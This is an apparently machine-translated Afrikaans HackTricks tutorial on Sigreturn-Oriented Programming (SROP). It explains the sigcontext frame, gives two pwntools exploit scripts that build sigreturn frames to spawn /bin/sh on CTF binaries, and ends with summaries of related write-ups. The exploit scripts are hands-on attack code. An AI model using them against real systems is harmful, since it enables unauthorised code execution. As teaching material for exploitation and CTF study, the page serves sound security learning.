# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

**`Sigreturn`** is 'n spesiale **syscall** wat hoofsaaklik gebruik word om op te skoon nadat 'n seinhanterer sy uitvoering voltooi het. Signale is onderbrekings wat deur die bedryfstelsel na 'n program gestuur word, dikwels om aan te dui dat 'n buitengewone situasie plaasgevind het. Wanneer 'n program 'n sein ontvang, stel dit tydelik sy huidige werk uit om die sein met 'n **seinhanterer** te hanteer, 'n spesiale funksie wat ontwerp is om met seine om te gaan.

Nadat die seinhanterer klaar is, moet die program sy vorige toestand **hervat** asof niks gebeur het nie. Dit is waar **`sigreturn`** in die prentjie kom. Dit help die program om **terug te keer van die seinhanterer** en herstel die program se toestand deur die stapelraamwerk (die gedeelte van geheue wat funksie-oproepe en plaaslike veranderlikes stoor) wat deur die seinhanterer gebruik is, skoon te maak.

Die interessante deel is hoe **`sigreturn`** die program se toestand herstel: dit doen dit deur **al die CPU se registerwaardes op die stapel te stoor.** Wanneer die sein nie meer geblokkeer word nie, **haal `sigreturn` hierdie waardes van die stapel af**, wat die CPU se register effektief herstel na hul toestand voordat die sein hanteer is. Dit sluit die stapelpuntregister (RSP) in, wat na die huidige bopunt van die stapel wys.

{% hint style="danger" %}
Om die syscall **`sigreturn`** vanaf 'n ROP-ketting te roep en **die registerwaardes by te voeg** wat ons wil h√™ dit in die **stapel** moet laai, is dit moontlik om al die registerwaardes te **beheer** en dus byvoorbeeld die syscall `execve` met `/bin/sh` te **roep**.
{% endhint %}

Let daarop dat hierdie 'n **tipe Ret2syscall** sou wees wat dit baie makliker maak om parameters te beheer om ander Ret2syscalls te roep:

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

As jy nuuskierig is, hierdie is die **sigcontext-struktuur** wat op die stapel gestoor word om die waardes later te herstel (diagram van [**hier**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Vir 'n beter verduideliking, kyk ook:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Voorbeeld

Jy kan 'n [**voorbeeld hier vind**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) waar die oproep na signeturn opgebou word via ROP (met die waarde `0xf` in rxa), alhoewel dit die finale aanval is van daar af:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Kyk ook na die [**exploit van hier**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) waar die bin√™re reeds `sigreturn` aanroep en dit dus nie nodig is om dit met 'n **ROP** te bou nie:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Ander Voorbeelde & Verwysings

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* Monteerbare bin√™re wat toelaat om na die stok te **skryf** en dan die **`sigreturn`** systaalaanroep te maak. Dit is moontlik om op die stok 'n [**ret2syscall**](rop-syscall-execv/) te skryf via 'n **sigreturn** struktuur en die vlag wat binne die geheue van die bin√™re is, te lees.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* Monteerbare bin√™re wat toelaat om na die stok te **skryf** en dan die **`sigreturn`** systaalaanroep te maak. Dit is moontlik om op die stok 'n [**ret2syscall**](rop-syscall-execv/) te skryf via 'n **sigreturn** struktuur (die bin√™re het die string `/bin/sh`).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64-bits, geen relro, geen kanarie, nx, geen pie. Eenvoudige buffer oorvloed wat die `gets` funksie misbruik met 'n gebrek aan gadgets wat 'n [**ret2syscall**](rop-syscall-execv/) uitvoer. Die ROP-ketting skryf `/bin/sh` in die `.bss` deur weer gets te roep, dit misbruik die **`alarm`** funksie om eax na `0xf` te stel om 'n **SROP** te roep en 'n skaal uit te voer.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64-bits monteerprogram, geen relro, geen kanarie, nx, geen pie. Die vloei maak dit moontlik om in die stok te skryf, verskeie registre te beheer, 'n systaalaanroep te maak en dan `exit` te roep. Die gekose systaalaanroep is 'n `sigreturn` wat registre sal stel en `eip` sal skuif om 'n vorige systaalinstruksie te roep en `memprotect` te hardloop om die bin√™re spasie na `rwx` te stel en die ESP in die bin√™re spasie te stel. Volgens die vloei sal die program weer intro ESP lees, maar in hierdie geval sal ESP na die volgende instruksie wys sodat die oordra van 'n skaal dit as die volgende instruksie sal skryf en dit sal uitvoer.
